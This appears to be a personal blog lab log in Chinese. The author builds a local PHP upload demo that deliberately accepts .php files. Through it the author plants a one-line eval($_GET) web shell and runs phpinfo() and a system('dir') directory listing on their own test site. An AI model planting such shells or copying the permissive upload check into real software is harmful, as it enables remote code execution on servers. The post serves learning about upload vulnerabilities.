# 文件上传 Get


# begin

  

&gt;写了file upload的短分享ppt然后得到自己可以写一个demo的问题，于是开始。

  

在得到demotest这个可以使用的本地网站之前经历了一场405风暴。&lt;br&gt;

  

&lt;!-- more --&gt;

  

## 源代码

首先先写了网页代码，index.html和upload.php

```html

index.html

  

&lt;html&gt;

&lt;head&gt;

&lt;meta charset=&#34;utf-8&#34;&gt;

&lt;title&gt;demo2&lt;/title&gt;

&lt;/head&gt;

&lt;body&gt;

  

&lt;form action=&#34;upload_file.php&#34; method=&#34;post&#34; enctype=&#34;multipart/form-data&#34;&gt;

    &lt;label for=&#34;file&#34;&gt;文件名：&lt;/label&gt;

    &lt;input type=&#34;file&#34; name=&#34;file&#34; id=&#34;file&#34;&gt;&lt;br&gt;

    &lt;input type=&#34;submit&#34; name=&#34;submit&#34; value=&#34;提交&#34;&gt;

&lt;/form&gt;

  

&lt;/body&gt;

&lt;/html&gt;

```

  

```php

upload.php

  

&lt;?php

// 允许上传的图片后缀

$allowedExts = array(&#34;gif&#34;, &#34;jpeg&#34;, &#34;jpg&#34;, &#34;png&#34;,&#34;php&#34;);

$temp = explode(&#34;.&#34;, $_FILES[&#34;file&#34;][&#34;name&#34;]);

echo $_FILES[&#34;file&#34;][&#34;size&#34;];

$extension = end($temp);     // 获取文件后缀名

if ((($_FILES[&#34;file&#34;][&#34;type&#34;] == &#34;image/gif&#34;)

|| ($_FILES[&#34;file&#34;][&#34;type&#34;] == &#34;image/jpeg&#34;)

|| ($_FILES[&#34;file&#34;][&#34;type&#34;] == &#34;image/jpg&#34;)

|| ($_FILES[&#34;file&#34;][&#34;type&#34;] == &#34;image/pjpeg&#34;)

|| ($_FILES[&#34;file&#34;][&#34;type&#34;] == &#34;image/x-png&#34;)

|| ($_FILES[&#34;file&#34;][&#34;type&#34;] == &#34;image/png&#34;)

|| ($_FILES[&#34;file&#34;][&#34;type&#34;] == &#34;application/octet-stream&#34;))

&amp;&amp; ($_FILES[&#34;file&#34;][&#34;size&#34;] &lt; 204800)   // 小于 200 kb

&amp;&amp; in_array($extension, $allowedExts))

{

    if ($_FILES[&#34;file&#34;][&#34;error&#34;] &gt; 0)

    {

        echo &#34;错误：: &#34; . $_FILES[&#34;file&#34;][&#34;error&#34;] . &#34;&lt;br&gt;&#34;;

    }

    else

    {

        echo &#34;上传文件名: &#34; . $_FILES[&#34;file&#34;][&#34;name&#34;] . &#34;&lt;br&gt;&#34;;

        echo &#34;文件类型: &#34; . $_FILES[&#34;file&#34;][&#34;type&#34;] . &#34;&lt;br&gt;&#34;;

        echo &#34;文件大小: &#34; . ($_FILES[&#34;file&#34;][&#34;size&#34;] / 1024) . &#34; kB&lt;br&gt;&#34;;

        echo &#34;文件临时存储的位置: &#34; . $_FILES[&#34;file&#34;][&#34;tmp_name&#34;] . &#34;&lt;br&gt;&#34;;

        // 判断当期目录下的 upload 目录是否存在该文件

        // 如果没有 upload 目录，你需要创建它，upload 目录权限为 777

        if (file_exists(&#34;upload/&#34; . $_FILES[&#34;file&#34;][&#34;name&#34;]))

        {

            echo $_FILES[&#34;file&#34;][&#34;name&#34;] . &#34; 文件已经存在。 &#34;;

        }

        else

        {

            // 如果 upload 目录不存在该文件则将文件上传到 upload 目录下

            move_uploaded_file($_FILES[&#34;file&#34;][&#34;tmp_name&#34;], &#34;upload/&#34; . $_FILES[&#34;file&#34;][&#34;name&#34;]);

            echo &#34;文件存储在: &#34; . &#34;upload/&#34; . $_FILES[&#34;file&#34;][&#34;name&#34;];

        }

    }

}

else

{

    echo &#34;非法的文件格式&#34;;

}

?&gt;

```

  

&lt;font size=1&gt;php代码是有限制的（网上找的所以只是简单修改了限制条件）&lt;/font&gt;

  

## 405 Method not allowed

然后我就GoLive&lt;br&gt;

&lt;img src=https://github.com/66lueflam144/66lueflam144.github.io/blob/gh-pages/img/in-post/demo%E5%88%9D%E5%A7%8B%E5%8C%96.png&gt;

&lt;br&gt;一切都很美好，然后上传文件

&lt;img src=https://github.com/66lueflam144/66lueflam144.github.io/blob/gh-pages/img/in-post/405.png&gt;

无论是什么文件都是405，405，405...&lt;br&gt;

抓耳挠腮到处找&lt;br&gt;

最后burp suite抓包获得Response

```response

...

Access-Control-Allow-Credentials:true

Allow:GET.HEAD,OPTIONS

...

```

  

可能是edge web server的限制吧——添加js、修改为Flask无果。于是通过phpstudy建立本地网站。&lt;br&gt;

  

建立网站，写好域名，选好根目录之后，把index.html和upload.php移入根目录中，打开网站运行成功，上传功能正常，可喜可贺，感天动地。

  

# Upload Method=GET file

  

## 上传ing and test

上传一个`get2.php`文件，内容为

```php

&lt;? php eval($_GET[1]); ?&gt;

```

  

与之前写的一句话木马都不一样，

- 这次使用的是`GET`方法

- 去除了eval()前面的@符号，不然看不到任何回显

  

上传成功之后回显文件上传到了`upload/，我们通过`eval()`函数的原理，对`1`进行赋值（替换）&lt;br&gt;

```

http://example.com/upload/get2.php?1=phpinfo();

```

  

就会看到phpinfo——说明上传成功也能被正确解析执行。&lt;br&gt;之前写的是`GET[&#39;shell&#39;]`，进行替换的时候被错误解析无法执行，报错*Parse error:syntax error, unexpected end of file:....:get2.php(1):eval()&#39;d code on line 1*,因为对`shell`进行赋值都是`GET[&#39;xxx&#39;]`，会被当作是字符执行。&lt;br&gt;

  

测试通过之后，进行输出目录。

  

## dir

因为搭建网站的环境是windows，所以使用`dir`命令来输出目录，如果是linux就用`ls`。

  

查询&lt;a href=https://learn.microsoft.com/zh-cn/windows-server/administration/windows-commands/dir&gt;dir官方文档&lt;/a&gt;之后，构建：

  

```url

http://example.com/upload/get2.php?1=system(%27dir%20/b/s/w/o/p%27);

```

  

界面就回显了一排整齐的文件的所在地址

  

接下来还可以通过其他命令进入这些文件里面进行一些操作。


---

> Author:   
> URL: https://66lueflam144.github.io/posts/c659435/  

